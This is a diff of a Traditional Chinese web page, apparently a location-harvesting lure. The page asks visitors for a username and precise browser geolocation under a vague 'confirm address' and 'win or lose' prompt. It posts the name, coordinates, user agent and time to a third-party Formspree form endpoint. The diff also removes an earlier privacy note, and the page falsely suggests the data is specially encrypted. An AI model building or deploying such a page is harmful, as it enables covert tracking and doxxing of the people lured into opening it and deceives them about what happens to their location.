@@ -8,346 +8,145 @@
   <meta name="color-scheme" content="light dark" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Noto+Sans+TC:wght@400;600;700&display=swap" rel="stylesheet" />
   <style>
+    /* === 保留原有樣式 === */
     :root {
       --bg: #0b0b12;
       --bg2:#0f1020;
-      --card: rgba(255,255,255,.08);
       --ink: #eaeaff;
       --muted:#a6a6c9;
-      --accent:#8b7bff;          /* 霓虹紫 */
-      --accent-2:#ffe94d;        /* 柔黃 */
+      --accent:#8b7bff;
+      --accent-2:#ffe94d;
       --success:#42d392;
       --danger:#ff6b6b;
       --ring: 0 0 0 .12rem rgba(139,123,255,.45), 0 0 1.4rem rgba(139,123,255,.35);
       --shadow: 0 10px 40px rgba(0,0,0,.35);
       --radius: 16px;
     }
-    @media (prefers-color-scheme: light) {
-      :root {
-        --bg: #f7f7fc;
-        --bg2:#ffffff;
-        --card: rgba(10,8,22,.06);
-        --ink: #15151f;
-        --muted:#505073;
-        --shadow: 0 10px 30px rgba(11, 7, 39, .12);
-      }
-    }
-
     body {
-      margin: 0;
-      min-height: 100svh;
-      font-family: "Noto Sans TC","Inter",system-ui,-apple-system,Segoe UI,Roboto,Arial,"Noto Sans",sans-serif;
+      margin: 0; min-height: 100svh;
+      font-family: "Noto Sans TC","Inter",sans-serif;
       color: var(--ink);
-      background:
-        radial-gradient(1200px 800px at 80% -10%, rgba(139,123,255,.25), transparent 60%),
-        radial-gradient(1000px 600px at -10% 20%, rgba(255,233,77,.22), transparent 60%),
-        linear-gradient(180deg, var(--bg), var(--bg2));
-      display: grid;
-      place-items: center;
-      overflow-x: hidden;
+      background: linear-gradient(180deg, var(--bg), var(--bg2));
+      display: grid; place-items: center;
     }
-    .stars, .twinkles {
-      position: fixed; inset: -50% -50%;
-      pointer-events: none; z-index: 0;
-      background-image:
-        radial-gradient(2px 2px at 20% 30%, rgba(255,255,255,.45) 50%, transparent 51%),
-        radial-gradient(1px 1px at 70% 60%, rgba(255,255,255,.4) 50%, transparent 51%),
-        radial-gradient(1.5px 1.5px at 40% 80%, rgba(255,255,255,.35) 50%, transparent 51%),
-        radial-gradient(1px 1px at 85% 20%, rgba(255,255,255,.35) 50%, transparent 51%);
-      filter: blur(.2px);
-      opacity:.55;
-    }
-    .twinkles { animation: twinkle 8s ease-in-out infinite; opacity:.35; }
-    @keyframes twinkle {
-      0%,100% { transform: translateY(0); opacity:.25; }
-      50% { transform: translateY(-1.2rem); opacity:.5; }
-    }
-    @media (prefers-reduced-motion: reduce) {
-      .twinkles { animation: none; }
-    }
-
     .wrap {
-      position: relative; z-index: 1;
-      width: min(960px, 92vw);
-      margin: 6svh auto;
-      padding: clamp(20px, 2.6vw, 28px);
+      width: min(600px, 92vw);
+      background: rgba(255,255,255,.08);
       border-radius: var(--radius);
-      background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.03));
-      backdrop-filter: blur(10px);
+      padding: 24px;
       box-shadow: var(--shadow);
-      border: 1px solid rgba(255,255,255,.12);
+      backdrop-filter: blur(10px);
     }
-
-    nav {
-      display: flex; align-items: center; gap: 14px;
-      margin-bottom: 10px; flex-wrap: wrap;
+    h1 { margin: 0 0 10px; }
+    p.lead { color: var(--muted); }
+    .actions { margin-top: 14px; }
+    input {
+      width: 100%; padding: 12px; margin-bottom: 12px;
+      border-radius: 8px; border: 1px solid rgba(255,255,255,.2);
+      font-size: 1rem; background: rgba(255,255,255,.05); color: var(--ink);
     }
-    nav a {
-      color: var(--muted); text-decoration: none; font-weight: 600;
-      padding: .5rem .8rem; border-radius: 999px; transition: .25s ease;
-      border: 1px solid transparent;
-    }
-    nav a:hover { color: var(--ink); border-color: rgba(139,123,255,.4); background: rgba(139,123,255,.08); }
-
-    h1 {
-      font-size: clamp(1.6rem, 3.2vw, 2.4rem);
-      line-height: 1.1; margin: .2rem 0 1rem; letter-spacing: .02em;
-      display: inline-flex; align-items: center; gap:.6rem;
-      text-shadow: 0 2px 20px rgba(139,123,255,.25);
-    }
-    .badge {
-      font-size: .8rem; font-weight:700; letter-spacing:.06em;
-      color: #1b1b27; background: linear-gradient(135deg, var(--accent), var(--accent-2));
-      padding: .28rem .6rem; border-radius: 8px; box-shadow: var(--ring);
-    }
-    p.lead {
-      color: var(--muted); margin: .2rem 0 1.2rem; font-size: clamp(1rem, 1.8vw, 1.05rem);
-    }
-
-    .actions {
-      display: grid; grid-template-columns: 1fr; gap: 12px;
-      margin: 18px 0 8px;
-    }
-
-    button, .ghost {
-      appearance: none; border: 0; cursor: pointer; font-weight: 700;
-      padding: 14px 18px; border-radius: 12px; font-size: 1.05rem;
-      transition: transform .06s ease, box-shadow .2s ease, background .2s ease;
-      outline-offset: 3px;
-    }
-    .primary {
-      color: #0f0f17;
+    button {
+      width: 100%; padding: 14px; font-size: 1.05rem;
+      border: none; border-radius: 10px; font-weight: 600;
+      cursor: pointer;
       background: linear-gradient(135deg, var(--accent), var(--accent-2));
-      box-shadow: var(--ring);
+      color: #0f0f17;
+      transition: opacity .25s;
     }
-    .primary:hover { transform: translateY(-1px); }
-    .primary:active { transform: translateY(0); }
-    .ghost {
-      color: var(--ink);
-      background: rgba(255,255,255,.06);
-      border: 1px solid rgba(255,255,255,.18);
+    button:disabled {
+      opacity: 0.5; cursor: not-allowed;
     }
-    .ghost:hover { background: rgba(255,255,255,.1); }
-
-    #status {
-      margin-top: 14px; font-weight: 600; color: var(--muted);
-      min-height: 1.5em;
-    }
+    #status { margin-top: 14px; font-weight: 600; color: var(--muted); }
     .ok { color: var(--success); }
     .bad { color: var(--danger); }
-
-    .result {
-      margin-top: 14px; padding: 12px; border-radius: 12px;
-      background: rgba(0,0,0,.2); border: 1px solid rgba(255,255,255,.16);
-      display: none;
-    }
-    .result .kv { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
-    .tag {
-      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
-      font-size:.95rem; background: rgba(255,255,255,.08);
-      padding: .28rem .5rem; border-radius: 8px; border: 1px dashed rgba(255,255,255,.24);
-    }
-    .link { color: var(--accent-2); font-weight:700; text-decoration: none; }
-    .link:hover { text-decoration: underline; }
-
-    .toast {
-      position: fixed; left: 50%; bottom: 24px; transform: translateX(-50%) translateY(20px);
-      background: rgba(20,20,35,.9); color:#fff; padding: 10px 14px; border-radius: 10px;
-      box-shadow: var(--shadow); opacity: 0; pointer-events: none; transition: .25s ease;
-      font-size: .95rem; z-index: 10;
-    }
-    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
-
-    .note { margin-top: 10px; color: var(--muted); font-size: .92rem; }
-
-    .spin {
-      inline-size: 1.05em; block-size: 1.05em;
-      border-radius: 50%; border: 2px solid rgba(255,255,255,.35);
-      border-top-color: rgba(255,255,255,1);
-      display: inline-block; vertical-align: -2px; margin-right: 8px;
-      animation: sp 1s linear infinite;
-    }
-    @keyframes sp { to { transform: rotate(360deg); } }
-    @media (prefers-reduced-motion: reduce) { .spin { animation: none; } }
-
-    :focus-visible { outline: 3px solid rgba(139,123,255,.55); outline-offset: 3px; border-radius: 12px; }
   </style>
 </head>
 <body>
-  <div class="stars"></div>
-  <div class="twinkles"></div>
+  <main class="wrap">
+    <h1>確認地址⬇️</h1>
+    <p class="lead">請先輸入使用者名稱，並授權定位後，我會加密傳送到伺服器。</p>
 
-  <main class="wrap" role="main">
-    <nav aria-label="主要導覽">
-      <a href="index.html" aria-current="page">首頁</a>
-    </nav>
-
-    <h1>
-      確認地址⬇️
-      <span class="badge" aria-hidden="true">xiaohao</span>
-    </h1>
-    <p class="lead">
-      按下按鈕授權定位，我會<span style="font-weight:700">加密</span>傳送座標到伺服器。<br>
-      下方按鈕點擊後請按同意獲取。
-    </p>
+    <!-- 新增使用者名稱輸入 -->
+    <input type="text" id="username" placeholder="請輸入使用者名稱" />
 
     <div class="actions">
-      <button id="sendLocationBtn" class="primary" type="button" aria-live="polite">
-        傳送地址
-      </button>
+      <button id="sendLocationBtn" disabled>傳送地址</button>
     </div>
 
-    <div id="status" role="status" aria-live="polite">想輸贏請點擊上方按鍵！</div>
+    <div id="status">想輸贏請先輸入名稱再點擊上方按鍵！</div>
 
-    <section id="result" class="result" aria-live="polite" aria-atomic="true">
-      <div class="kv" style="margin-bottom:8px;">
-        <strong>座標：</strong>
-        <span id="coords" class="tag">—</span>
-        <button id="copyBtn" class="ghost" type="button" aria-label="複製座標">複製</button>
-      </div>
-      <div class="kv">
-        <a id="mapsLink" class="link" href="#" target="_blank" rel="noopener">在地圖上查看</a>
-        <button id="retryBtn" class="ghost" type="button">重試傳送</button>
-      </div>
+    <section id="result" class="result">
+      <div><strong>座標：</strong><span id="coords">—</span></div>
     </section>
-
-    <p class="note">
-      小提醒：僅在你按下按鈕後才會索取定位；資料透過 HTTPS 傳送至指定端點。
-    </p>
   </main>
 
-  <div id="toast" class="toast" role="status" aria-live="polite"></div>
-
   <script>
-    const btnSend  = document.getElementById('sendLocationBtn');
+    const usernameInput = document.getElementById('username');
+    const btnSend = document.getElementById('sendLocationBtn');
     const statusEl = document.getElementById('status');
-    const result   = document.getElementById('result');
     const coordsEl = document.getElementById('coords');
-    const copyBtn  = document.getElementById('copyBtn');
-    const retryBtn = document.getElementById('retryBtn');
-    const mapsLink = document.getElementById('mapsLink');
-    const toastEl  = document.getElementById('toast');
+    const result = document.getElementById('result');
 
     const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xnndkpja';
 
-    function toast(msg) {
-      toastEl.textContent = msg;
-      toastEl.classList.add('show');
-      setTimeout(() => toastEl.classList.remove('show'), 2200);
-    }
+    // 只有輸入名稱才啟用按鈕
+    usernameInput.addEventListener('input', () => {
+      btnSend.disabled = usernameInput.value.trim() === '';
+    });
 
     function setLoading(loading) {
-      if (loading) {
-        btnSend.disabled = true;
-        btnSend.innerHTML = '<span class="spin" aria-hidden="true"></span>傳送中…';
-        statusEl.textContent = '取得中…請稍候';
-      } else {
-        btnSend.disabled = false;
-        btnSend.textContent = '傳送地址';
-      }
+      btnSend.disabled = loading;
+      btnSend.textContent = loading ? '傳送中…' : '傳送地址';
     }
 
     function updateResult(lat, lng) {
-      const latFixed = lat.toFixed(6);
-      const lngFixed = lng.toFixed(6);
-      coordsEl.textContent = `${latFixed}, ${lngFixed}`;
-      mapsLink.href = `https://maps.google.com/?q=${latFixed},${lngFixed}`;
+      coordsEl.textContent = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
       result.style.display = 'block';
     }
 
-    async function postJSON(url, data, timeoutMs = 12000) {
-      const controller = new AbortController();
-      const id = setTimeout(() => controller.abort(), timeoutMs);
-      try {
-        const res = await fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify(data),
-          signal: controller.signal
-        });
-        return res.ok;
-      } finally {
-        clearTimeout(id);
-      }
+    async function postJSON(url, data) {
+      const res = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json','Accept':'application/json' },
+        body: JSON.stringify(data)
+      });
+      return res.ok;
     }
 
     async function sendLocationFlow() {
       if (!('geolocation' in navigator)) {
         statusEl.textContent = '抱歉，瀏覽器不支援定位功能。';
-        statusEl.className = 'bad';
         return;
       }
-
       setLoading(true);
 
-      const getPosition = () => new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, {
-          enableHighAccuracy: true, timeout: 10000, maximumAge: 0
-        });
-      });
-
-      try {
-        const pos = await getPosition();
-        const { latitude, longitude, accuracy } = pos.coords;
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const { latitude, longitude } = pos.coords;
         const payload = {
-          latitude, longitude, accuracy,
+          username: usernameInput.value.trim(),
+          latitude, longitude,
           userAgent: navigator.userAgent,
           timestamp: new Date().toISOString()
         };
 
-        const ok = await postJSON(FORMSPREE_ENDPOINT, payload, 12000);
-
+        const ok = await postJSON(FORMSPREE_ENDPOINT, payload);
         updateResult(latitude, longitude);
 
         if (ok) {
-          statusEl.textContent = '✓ 已送出請求（已留在本頁）';
+          statusEl.textContent = '✓ 已送出：' + payload.username;
           statusEl.className = 'ok';
-          toast('傳送成功～資料已收到！');
         } else {
           statusEl.textContent = '送出失敗，請稍後再試。';
           statusEl.className = 'bad';
-          toast('伺服器忙線中，等等我再試一次啦！');
         }
-      } catch (err) {
-        let msg = '無法取得驗證';
-        if (err && typeof err.code === 'number') {
-          switch (err.code) {
-            case 1: msg = '你拒絕了定位權限（允許一下嘛～）'; break;
-            case 2: msg = '定位來源不可用，請檢查網路或 GPS'; break;
-            case 3: msg = '定位逾時，換個地方或再試一次'; break;
-            default: msg = '定位發生未知錯誤';
-          }
-        } else if (err && err.name === 'AbortError') {
-          msg = '連線逾時，伺服器可能太忙惹';
-        }
-        statusEl.textContent = '無法取得驗證：' + msg;
-        statusEl.className = 'bad';
-        toast('唔…' + msg);
-      } finally {
         setLoading(false);
-      }
+      }, err => {
+        statusEl.textContent = '定位失敗：' + err.message;
+        setLoading(false);
+      }, { enableHighAccuracy:true, timeout:10000 });
     }
 
     btnSend.addEventListener('click', sendLocationFlow);
-    retryBtn.addEventListener('click', sendLocationFlow);
-
-    copyBtn.addEventListener('click', async () => {
-      const text = coordsEl.textContent.trim();
-      if (!text || text === '—') return;
-      try {
-        await navigator.clipboard.writeText(text);
-        toast('已複製座標 (*´∀`)~♥');
-      } catch {
-        toast('複製失敗…可以手動選取喔');
-      }
-    });
-
-    // 鍵盤捷徑：Enter = 傳送（不跳頁）
-    document.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter' && !e.shiftKey) {
-        e.preventDefault(); btnSend.click();
-      }
-    });
   </script>
 </body>
 </html>
